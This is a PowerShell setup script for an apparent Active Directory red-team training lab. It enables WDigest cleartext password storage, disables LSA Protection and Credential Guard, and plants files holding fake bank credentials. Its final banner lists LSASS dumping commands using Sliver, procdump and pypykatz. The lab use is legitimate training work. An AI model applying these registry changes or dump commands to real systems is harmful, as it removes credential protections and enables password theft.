# ============================================================
# ORSUBANK AD RED TEAM LAB - CREDENTIAL EXPOSURE VULNERABILITY
# ============================================================
# Script Name: Enable-CredentialExposure.ps1
# Purpose: Enables WDigest and disables protections for credential dumping
# Location: Run on DC01 AND WS01/WS02 (all machines)
# Reboot Required: YES (changes take effect after reboot)
#
# WHAT THIS SCRIPT DOES:
# - Enables WDigest authentication (stores cleartext passwords in memory)
# - Disables LSA Protection (allows LSASS dumping)
# - Disables Credential Guard (if enabled)
# - Creates conditions for successful credential dumping
#
# WHY THIS IS VULNERABLE:
# Modern Windows disables WDigest by default. When enabled:
# - Passwords are stored in CLEARTEXT in LSASS memory
# - Attackers can dump memory and get actual passwords
# - No cracking required!
#
# REAL-WORLD SCENARIO:
# - Legacy applications sometimes require WDigest
# - Older systems may have it enabled by default
# - Misconfiguration during troubleshooting
# ============================================================

# Verify running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] ERROR: Run this script as Administrator!" -ForegroundColor Red
    exit 1
}

Write-Host @"

╔══════════════════════════════════════════════════════════════════╗
║      ORSUBANK - ENABLE CREDENTIAL EXPOSURE VULNERABILITY         ║
║                                                                  ║
║  This script enables WDigest and disables security protections   ║
║  to allow credential dumping attacks for training purposes.      ║
║                                                                  ║
║  ⚠️  REBOOT REQUIRED AFTER RUNNING THIS SCRIPT                   ║
╚══════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# 1. ENABLE WDIGEST AUTHENTICATION
# ============================================================
# WDigest stores passwords in cleartext in LSASS memory
# Registry: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
# Key: UseLogonCredential = 1
# ============================================================

Write-Host "[*] Enabling WDigest authentication (cleartext passwords in memory)..." -ForegroundColor Yellow

$WDigestPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"

# Create WDigest key if it doesn't exist
if (-NOT (Test-Path $WDigestPath)) {
    New-Item -Path $WDigestPath -Force | Out-Null
    Write-Host "    Created WDigest registry key" -ForegroundColor DarkGray
}

# Set UseLogonCredential to 1 (enable cleartext password storage)
Set-ItemProperty -Path $WDigestPath -Name "UseLogonCredential" -Value 1 -Type DWord -Force
Write-Host "[+] WDigest enabled (UseLogonCredential = 1)" -ForegroundColor Green
Write-Host "    Passwords will now be stored in CLEARTEXT in LSASS memory" -ForegroundColor Red

# ============================================================
# 2. DISABLE LSA PROTECTION (RunAsPPL)
# ============================================================
# LSA Protection runs LSASS as a Protected Process Light
# This prevents memory dumping - we need to disable it
# Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
# Key: RunAsPPL = 0
# ============================================================

Write-Host "`n[*] Disabling LSA Protection (RunAsPPL)..." -ForegroundColor Yellow

$LsaPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"

# Disable RunAsPPL
Set-ItemProperty -Path $LsaPath -Name "RunAsPPL" -Value 0 -Type DWord -Force
Write-Host "[+] LSA Protection disabled (RunAsPPL = 0)" -ForegroundColor Green
Write-Host "    LSASS can now be dumped with procdump/Mimikatz" -ForegroundColor Red

# ============================================================
# 3. DISABLE CREDENTIAL GUARD
# ============================================================
# Credential Guard uses virtualization to protect credentials
# We disable it to allow traditional credential dumping
# ============================================================

Write-Host "`n[*] Disabling Credential Guard..." -ForegroundColor Yellow

$DeviceGuardPath = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"

# Create key if doesn't exist
if (-NOT (Test-Path $DeviceGuardPath)) {
    New-Item -Path $DeviceGuardPath -Force | Out-Null
}

# Disable Credential Guard
Set-ItemProperty -Path $DeviceGuardPath -Name "EnableVirtualizationBasedSecurity" -Value 0 -Type DWord -Force
Set-ItemProperty -Path $DeviceGuardPath -Name "RequirePlatformSecurityFeatures" -Value 0 -Type DWord -Force

# Also disable via Lsa key
Set-ItemProperty -Path $LsaPath -Name "LsaCfgFlags" -Value 0 -Type DWord -Force

Write-Host "[+] Credential Guard disabled" -ForegroundColor Green

# ============================================================
# 4. CREATE SENSITIVE FILES (JUICY DATA)
# ============================================================
# Create files with "sensitive" data for attackers to find
# ============================================================

Write-Host "`n[*] Creating sensitive files with credentials..." -ForegroundColor Yellow

# Create directories
$ITPath = "C:\IT"
$BackupPath = "C:\Backup"
$ScriptsPath = "C:\Scripts"

New-Item -Path $ITPath -ItemType Directory -Force | Out-Null
New-Item -Path $BackupPath -ItemType Directory -Force | Out-Null
New-Item -Path $ScriptsPath -ItemType Directory -Force | Out-Null

# Create passwords.txt
$PasswordsContent = @"
========================================
     ORSUBANK IT ADMIN PASSWORDS
          ** CONFIDENTIAL **
========================================

SQL Server SA Account:
  Username: sa
  Password: SQLAdmin@2024!

Domain Admin Backup Account:
  Username: ammulu.orsu
  Password: OrsUBank2024!

VPN Access (Emergency):
  Username: vpnadmin
  Password: VPNUser123!

Remote Support Tool:
  Username: support
  Password: Support@Bank2024

========================================
DO NOT SHARE - FOR IT USE ONLY
Last Updated: 2024-12-01
========================================
"@
Set-Content -Path "$ITPath\passwords.txt" -Value $PasswordsContent
Write-Host "[+] Created: C:\IT\passwords.txt" -ForegroundColor Green

# Create database credentials
$DBCredsContent = @"
========================================
   ORSUBANK DATABASE CONNECTIONS
========================================

Production SQL Server:
  Server: DC01.orsubank.local
  Database: BankingApp
  Username: sqlservice
  Password: MYpassword123#

Backup SQL Instance:
  Server: DC01.orsubank.local,1434
  Database: BankingBackup
  Username: backupservice
  Password: SQLAgent123!

Connection String:
Server=DC01.orsubank.local;Database=BankingApp;User Id=sqlservice;Password=MYpassword123#;

========================================
"@
Set-Content -Path "$BackupPath\database_credentials.txt" -Value $DBCredsContent
Write-Host "[+] Created: C:\Backup\database_credentials.txt" -ForegroundColor Green

# Create service accounts file
$ServiceAccountsContent = @"
========================================
   ORSUBANK SERVICE ACCOUNT LIST
========================================

1. SQL Service Account
   Username: sqlservice
   Password: MYpassword123#
   Purpose: SQL Server database engine

2. HTTP Service Account
   Username: httpservice
   Password: Summer2024!
   Purpose: Web server application pool

3. IIS Service Account
   Username: iisservice
   Password: P@ssw0rd
   Purpose: IIS application hosting

4. Backup Service Account
   Username: backupservice
   Password: SQLAgent123!
   Purpose: Automated database backups

========================================
KEEP SECURE - AUDIT ANNUALLY
========================================
"@
Set-Content -Path "$ScriptsPath\service_accounts.txt" -Value $ServiceAccountsContent
Write-Host "[+] Created: C:\Scripts\service_accounts.txt" -ForegroundColor Green

# ============================================================
# VERIFICATION
# ============================================================

Write-Host "`n[*] Verifying configuration..." -ForegroundColor Yellow

# Check WDigest
$WDigestValue = (Get-ItemProperty -Path $WDigestPath -Name "UseLogonCredential" -ErrorAction SilentlyContinue).UseLogonCredential
Write-Host "    WDigest UseLogonCredential: $WDigestValue $(if($WDigestValue -eq 1){'(ENABLED - Vulnerable)'} else {'(Disabled)'})" -ForegroundColor $(if($WDigestValue -eq 1){'Red'}else{'Green'})

# Check LSA Protection
$RunAsPPL = (Get-ItemProperty -Path $LsaPath -Name "RunAsPPL" -ErrorAction SilentlyContinue).RunAsPPL
Write-Host "    LSA RunAsPPL: $RunAsPPL $(if($RunAsPPL -eq 0){'(DISABLED - Vulnerable)'} else {'(Enabled)'})" -ForegroundColor $(if($RunAsPPL -eq 0){'Red'}else{'Green'})

# ============================================================
# ATTACK INSTRUCTIONS
# ============================================================

Write-Host @"

╔══════════════════════════════════════════════════════════════════╗
║               CREDENTIAL EXPOSURE READY!                          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  ⚠️  YOU MUST REBOOT FOR CHANGES TO TAKE EFFECT!                  ║
║                                                                  ║
║  After reboot, credentials will be stored in cleartext:          ║
║  - User logs in → Password stored in LSASS memory                ║
║  - Dump LSASS → Get cleartext passwords                          ║
║                                                                  ║
║  SENSITIVE FILES CREATED:                                         ║
║  - C:\IT\passwords.txt                                           ║
║  - C:\Backup\database_credentials.txt                            ║
║  - C:\Scripts\service_accounts.txt                               ║
║                                                                  ║
║  ATTACK COMMANDS (Sliver):                                       ║
║  1. Get SYSTEM:                                                  ║
║     > getsystem                                                  ║
║                                                                  ║
║  2. Dump LSASS:                                                  ║
║     > procdump -p lsass.exe -o /tmp/lsass.dmp                    ║
║                                                                  ║
║  3. Extract creds (on Kali):                                     ║
║     $ pypykatz lsa minidump lsass.dmp                            ║
║                                                                  ║
║  Walkthrough: walkthroughs/04_credential_dumping.md              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Green

Write-Host "[✓] Credential exposure vulnerability configured!" -ForegroundColor Green
Write-Host "[!] REBOOT REQUIRED - Run: Restart-Computer -Force" -ForegroundColor Yellow
Write-Host "`n"
